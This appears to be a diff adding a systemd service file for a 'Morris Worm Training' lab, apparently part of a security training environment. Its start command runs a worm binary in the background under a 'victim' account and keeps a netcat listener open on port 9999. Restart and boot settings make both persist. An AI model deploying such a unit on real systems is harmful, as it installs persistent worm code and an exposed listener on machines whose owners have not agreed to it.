@@ -1,0 +1,14 @@
+[Unit]
+Description=Morris Worm Training Listener
+After=network.target
+
+[Service]
+Type=simple
+User=victim
+WorkingDirectory=/opt/morris
+ExecStart=/bin/bash -c '/opt/morris/worm & exec nc -lk -p 9999'
+Restart=always
+RestartSec=5
+
+[Install]
+WantedBy=multi-user.target
